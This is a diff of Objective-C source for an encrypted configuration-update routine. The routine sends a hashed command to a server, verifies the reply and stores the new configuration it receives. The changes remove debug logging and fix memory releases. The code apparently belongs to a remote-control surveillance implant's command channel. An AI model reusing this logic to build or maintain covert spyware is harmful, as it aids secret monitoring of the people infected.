@@ -39,27 +39,18 @@
 
 - (BOOL)perform
 {
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   uint32_t command = PROTO_NEW_CONF;
   NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                              length: sizeof(uint32_t)];
+                                                             
   NSData *commandSha = [commandData sha1Hash];
   [commandData appendData: commandSha];
   
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
-  
   [commandData encryptWithKey: gSessionKey];
   
-  //
   // Send encrypted message
-  //
   NSURLResponse *urlResponse    = nil;
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
@@ -71,9 +62,6 @@
 
   if (replyData == nil)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"empty reply from server");
-#endif
       [infoManager release];
       [commandData release];
       [outerPool release];
@@ -111,50 +99,36 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+      // FIXED-
+      [replyDecrypted release];
       [infoManager release];
+      [commandData release];
+      [outerPool release];
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
   
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
-  
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"sha mismatch");
-#endif
-
-      [infoManager release];
       [replyDecrypted release];
+      [infoManager release];
       [commandData release];
-      [outerPool release];
-      
+      [outerPool release];      
       return NO;
     }
   
   if (command != PROTO_OK)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"No configuration available (command %d)", command);
-#endif
-      
+    { 
       [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
     
   uint32_t configSize = 0;
+  
   @try
     {
       [replyDecrypted getBytes: &configSize
@@ -162,37 +136,23 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on configSize makerange (%@)", [e reason]);
-#endif
-
       [infoManager logActionWithDescription: @"Corrupted configuration received"];
-      [infoManager release];
       
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
-  
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"configSize: %d", configSize);
-#endif
-  
+
   if (configSize == 0)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"configuration size is zero!");
-#endif
-
       [infoManager logActionWithDescription: @"Corrupted configuration received"];
+     
       [infoManager release];
-
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -205,37 +165,25 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on configData makerange (%@)", [e reason]);
-#endif
-
       [infoManager logActionWithDescription: @"Corrupted configuration received"];
-      [infoManager release];
       
+      [infoManager release];      
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
-  //
   // Store new configuration file
-  //
   RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
   
   if ([taskManager updateConfiguration: configData] == FALSE)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"Error while storing new configuration");
-#endif
-    
-      [infoManager release];
+    {  
       [configData release];
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -248,7 +196,7 @@
   return YES;
 }
 
-- (BOOL)sendConfAck:(BOOL)retAck
+- (BOOL)sendConfAck:(int)retAck
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
@@ -261,15 +209,9 @@
   NSData *commandSha = [commandData sha1Hash];
   [commandData appendData: commandSha];
   
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
-  
   [commandData encryptWithKey: gSessionKey];
   
-  //
   // Send encrypted message
-  //
   NSURLResponse *urlResponse    = nil;
   NSData *replyData             = nil;
   
@@ -278,16 +220,14 @@
 
   if (replyData == nil)
     {
-#ifdef DEBUG_CONF_NOP
-    errorLog(@"empty reply from server");
-#endif
-    [commandData release];
-    [outerPool release];
-    
-    return NO;
+      [commandData release];
+      [outerPool release];
+      return NO;
     }
-    
+  
+  [commandData release];    
   [outerPool release];
+
   return YES;
 }
 @end
